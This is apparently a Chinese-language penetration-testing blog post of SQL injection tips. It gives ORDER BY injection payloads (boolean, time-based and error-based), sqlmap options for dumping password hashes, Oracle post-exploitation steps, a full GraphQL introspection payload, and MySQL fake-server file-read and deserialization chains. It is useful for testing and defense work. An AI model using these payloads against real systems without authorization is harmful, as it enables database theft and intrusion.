---
title: "SQL注入在实战中的Tips合集"
slug: "sqli-tricks-in-pentest"
description: "已经...要....变成脚本小子的模样了!!!"
date: 2023-07-10T01:26:07+08:00
categories: ["NOTES&SUMMARY"]
series: []
tags: ["PENTEST", "SQLi"]
draft: false
toc: true
---

从实战中总结的一些小技巧，希望能帮助到一些人www

----

## order by注入

老生常谈，参数中出现可能为字段或表名、或出现排序有关的（比如desc, asc）就会被怀疑是sql注入点，但不是所有这种“疑似能注入”的地方都能被注——或者说重点关注什么样的字段是有说法的，这一点结合sql注入防御会更好理解

以php为例，php.ini可以设置`magic_quotes_gpc=on`开启对引号的转义，mysql中设`secure_file_priv=null`，代码中使用PDO预编译并设置

![image-20230705224758318](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230705224758318.png)

以上三项如果设置有误同样会导致报错注入的产生

java中的防御步骤类似，除了叠waf以外 也无非是转义/预编译、黑/白名单、设权限三板斧，后两者先不论， **mybatis**在对参数进行预处理时是不可以对order by后的参数使用`#{}`的，而是只可以使用`${}`！原因时order by语句后的字段名或字段位置是不可以加引号的，而使用预编译则一定会带`'`，导致可能出现的注入（普通预编译也会这样）；而**Hibernate**相对来说可以避免这一问题

而order by注入本身由于语义的原因 是不能直接使用`and 1=1`来判断的，需要用到条件语句做嵌套，举例：

```sql
select * from admin order by if(1=1,username,password);	# example
select * from admin order by if((substr((select user()),1,1)='r'),username,password);
```

时间盲注也不能简单使用`sleep()`，因为会对查询的每条内容执行排序 可能会造成ddos，需要用到子查询

```sql
select * from admin order by if((substr((select user()),1,1)='r'),sleep(5),password);	# may ddos
select * from admin order by if((substr((select user()),1,1)='r'),(select 1 from (select sleep(2)) as b),password);
```

报错

```sql
select * from admin order by (extractvalue(1,concat(0x3a,version())),1);
```

## sqlmap实用参数

官方文档：https://github.com/sqlmapproject/sqlmap/wiki/Usage

- `-p "<param>"`：指定注入参数，如遇POST+json类型的请求包（或需要自定义注入位置） 在要注入的位置加`*`
- `-U "CU" --passwords`：爆破当前用户的密码hash，`--passwords`爆所有用户hash
- `--csrf-token="<csrf name>"`：指定页面隐藏的csrf-token参数，可通过`--csrf-url="<url>"`指定token来源的地址，还可以通过`--eval`配合处理多个参数（效果拔群）
- `--gui`：启动自带GUI界面，包含各种参数的使用说明

![image-20230705174602794](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230705174602794.png)

- sqlmap根目录下自带一个`sqlmapapi.py` 封装了一些接口，可以通过这些接口发起扫描（不常见也不常用，但应该对造轮子有帮助

![image-20230705174431111](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230705174431111.png)

## sqlmap坑点

- `--batch`在windows和linux上表现不同
- 如果不是`-r`指定请求包，请注意sqlmap发包是否会导致相应包全是302，如果出现这种情况 建议指定部分请求头
- 小概率出现：别人电脑上能跑出来注入 但你不行的玄学情况，偶发性bug 暂未找到原因

## Oracle注入及后续利用

单独把Oracle数据库拿出来说的原因是sqlmap并不支持对它执行`--os-cmd`或`--os-shell`，所以与mysql, mssql相比稍有区别

1. 收集信息，库名、表名一把梭，列列重要数据 ~~（刷分用~~

2. 查当前用户的密码hash并尝试爆明文

```
--is-dba				# 是否dba
-U "CU" --passwords		# 当前用户密码
--passwords				# 所有用户密码
```

3. 用sql-shell查当前SID和当前ip，尝试外连

```
select instance_name from v$instance
select sys_context('userenv','ip_address') from dual
```

4. 如果可以外连，用 [Multiple Database Utilization Tools](https://github.com/SafeGroceryStore/MDUT)做后续利用

*此处举例用户名为sys（是dba），用户名这里需要改为`sys as sysdba`才能正确连接！

![image-20230705180830895](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230705180830895.png)

MDUT自带了HTTP隧道功能，还有常见的提权一把梭+列系统文件

5. *如果不能外连但为高权限用户，尝试执行java代码反弹（待补充）

6. Navicat或DBeaver查看数据库内具体内容；Navicat可以使用对应的隧道

## GraphQL注入

graphql有比较特殊的语法和查询方式，是便于前后端交互的语言 而不是便于后端和数据库交互的语言，后端数据都以graph 图的结构进行保存，需要设置好清晰的访问控制 不然就会被一锅端——graph的内省特性允许我们枚举数据库类型信息（见下）

graphql本身就很少见 在实战环境中更是少中又少，但我之前hvv还真见过这种站点，怎么发现端点的不太记得清了（不是dirsearch就是burpsuite扒请求记录），这里简单记录一下实操过程：

```
https://example.com/graphql?query=xxxxx
```

存在这样的可访问端点，直接用内省的payload枚举数据库结构信息

```
/graphql?query=fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
```

再使用https://graphql-kit.com/graphql-voyager/进行图的生成

![image-20230707152257406](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230707152257406.png)

![image-20230707150342238](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230707150342238.png)

通过可视化的结构构造查询数据的payload，构造方式参见 [官方文档](https://graphql.cn/learn/queries/)或 [这个仓库](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)

![image-20230707150640501](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230707150640501.png)

拿到敏感数据就可以轻松愉快的写报告了，几百分轻松get~

当然了，如果站点做了详细的鉴权 那么所有的查询都是需要token的，没有token的我们只能到此为止了QAQ

![image-20230707150842841](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230707150842841.png)

## 伪服务端进行任意文件读

原理不再赘述（可参见之前写过的博客-> [MySQL 伪服务端读客户端任意文件](https://amiaaaz.github.io/2021/12/19/mysql-pseudo-server/)），存在以下应用场景

- 读配置文件

如后台可设置连接其它数据库，通过伪服务端读敏感信息（工具一把梭-> [mysql-fake-server](https://github.com/4ra1n/mysql-fake-server)

- (php)与phar反序列化、文件上传的结合

mysqli中的读文件会调用`php_stream_open_wrapper_ex`函数，也就是说 如果任意读的文件是phar 就可以反序列化

可以先通过反序列化链子构造phar（甚至不需要有链子，只要支持反序列化 比如最简单的sopaclient等等内置类反序列化），结合文件上传，再用mysql连接读这个phar 触发反序列化

- (java)jdbc反序列化

工具同上

- （防守）做蜜罐

微步有成型的蜜罐可开箱即用